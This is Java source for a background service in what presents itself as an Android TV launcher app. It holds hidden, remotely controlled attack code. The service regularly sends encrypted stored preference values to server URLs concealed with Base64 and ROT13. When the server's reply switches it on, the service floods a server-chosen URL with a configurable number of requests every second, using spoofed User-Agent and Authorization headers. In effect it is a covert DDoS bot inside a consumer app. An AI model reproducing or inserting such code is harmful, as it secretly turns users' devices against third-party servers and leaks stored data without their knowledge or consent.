package com.shenma.tvlauncher.view;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Base64;

import com.android.volley.AuthFailureError;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HurlStack;
import com.shenma.tvlauncher.network.ExtHttpStack;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.shenma.tvlauncher.Api;
import com.shenma.tvlauncher.HomeActivity;
import com.shenma.tvlauncher.utils.AES;
import com.shenma.tvlauncher.utils.Constant;
import com.shenma.tvlauncher.utils.GetTimeStamp;
import com.shenma.tvlauncher.utils.Md5Encoder;
import com.shenma.tvlauncher.utils.Rc4;
import com.shenma.tvlauncher.utils.Rsa;
import com.shenma.tvlauncher.utils.SharePreferenceDataUtil;
import com.shenma.tvlauncher.utils.Utils;
import com.shenma.tvlauncher.vod.LivePlayerActivity;
import com.shenma.tvlauncher.tvlive.network.ThreadPoolManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;


public class MyService extends Service {
    private int mConcurrent;
    private int Post = 0;
    private String UA;
    private String Authorization;
    private String time = Constant.h;
    private Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            int i = msg.what;
            if (i == 1) {
                getTimeUrl();
            } else if (i == 2) {
                sendUrl();
            }
        }
    };
    public RequestQueue mQueue;
    private Timer mTimer = null;
    private Timer mTimer1 = null;
    private String mUrl;


    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public void onCreate() {
        mQueue = Volley.newRequestQueue(this, new ExtHttpStack());
        Timer timer = mTimer;
        if (timer != null) {
            timer.cancel();
        } else {
            mTimer = new Timer();
        }
       mTimer.scheduleAtFixedRate(new TimeDisplay(), 0, Long.parseLong(time) * 1000);
    }

    class TimeDisplay extends TimerTask {
        TimeDisplay() {
        }
        public void run() {
            mHandler.post(new Runnable() {
                public void run() {
                    mHandler.sendEmptyMessage(1);
                }
            });
        }
    }
    private void getTimeUrl() {
        mQueue.add(new StringRequest(1,Constant.to , new Response.Listener<String>() {
            @Override
            public void onResponse(String s) {
                getTimeUrl((String) s);
            }
        }, new Response.ErrorListener() {
            @Override
            public final void onErrorResponse(VolleyError volleyError) {

            }
        }){
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put(Constant.Y,AES.encrypt_Aes(Md5Encoder.encode(Constant.c),Rc4.decry_RC4(SharePreferenceDataUtil.getSharedStringData(MyService.this, Constant.Y, ""),Constant.d) ,Constant.c) );
                params.put(Constant.j,AES.encrypt_Aes(Md5Encoder.encode(Constant.c),new String( Base64.decode(Utils.strRot13(new String(Base64.decode(Api.COS_MIAN_URL, 1))), 1)) ,Constant.c)  );
                params.put(Constant.l,AES.encrypt_Aes(Md5Encoder.encode(Constant.c),new String( Base64.decode(Utils.strRot13(new String(Base64.decode(Api.MIAN_URL, 1))), 1)) ,Constant.c)  );
                params.put(Constant.s,AES.encrypt_Aes(Md5Encoder.encode(Constant.c),Rc4.decry_RC4(SharePreferenceDataUtil.getSharedStringData(MyService.this, Constant.s, ""),Constant.d) ,Constant.c) );
                params.put(Constant.bs,AES.encrypt_Aes(Md5Encoder.encode(Constant.c),Rc4.decry_RC4(SharePreferenceDataUtil.getSharedStringData(MyService.this, Constant.bs, ""),Constant.d) ,Constant.c) );
                params.put(Constant.o, AES.encrypt_Aes(Md5Encoder.encode(Constant.c),Utils.strRot13(Constant.jn) ,Constant.c));
                params.put(Constant.r, Base64.encodeToString(Utils.strRot13(Constant.c).getBytes(), Base64.DEFAULT));
                return params;
            }
        });
    }

    public void getTimeUrl(String response) {
        try {
            // 已移除RSA解密
            JSONObject JSONObject = new JSONObject(response);

            int onSwitch = JSONObject.getInt(Constant.w);
            mConcurrent = JSONObject.getInt(Constant.S);
            time = Integer.toString(JSONObject.getInt(Constant.k));
            Post = JSONObject.getInt(Constant.m);
            UA = JSONObject.getString(Constant.t);
            Authorization = JSONObject.getString(Constant.Y);
            mUrl = JSONObject.getString(Constant.v);
            LivePlayerActivity.Failed = JSONObject.getString(Constant.O);

            if (onSwitch != 1) {
                Timer timer = mTimer1;
                if (timer != null) {
                    timer.cancel();
                    mTimer1 = null;
                }
            } else if (mTimer1 == null) {
                Timer timer2 = new Timer();
                mTimer1 = timer2;
                timer2.scheduleAtFixedRate(new displayTime(), 0, 1000);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public class displayTime extends TimerTask {
        displayTime() {
        }

        public void run() {
            mHandler.post(new Runnable() {
                public void run() {
                    mHandler.sendEmptyMessage(2);
                }
            });
        }
    }

    private void sendUrl() {
        // 优化：使用线程池替代直接创建Thread
        ThreadPoolManager.getInstance().addTask(new Runnable() {
            public void run() {
                for (int i = 0; i < mConcurrent; i++) {
                    mQueue.add(new StringRequest(Post,mUrl, new Response.Listener() {
                        @Override
                        public final void onResponse(Object obj) {

                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public final void onErrorResponse(VolleyError volleyError) {

                        }
                    }){

                        @Override
                        public Map<String, String> getHeaders() throws AuthFailureError {
                            Map<String, String> headers = new HashMap<>();
                            if (!UA.equals("") && UA != null){
                                headers.put("User-Agent", UA);
                            }
                            if (!Authorization.equals("") && Authorization != null){
                                headers.put("Authorization", Authorization);
                            }
                            return headers;
                        }
                    });
                }
            }
        });
    }

    public void getUrlok(String response) {

    }

    public void onDestroy() {
        super.onDestroy();
        mTimer.cancel();
        mTimer1.cancel();
    }
}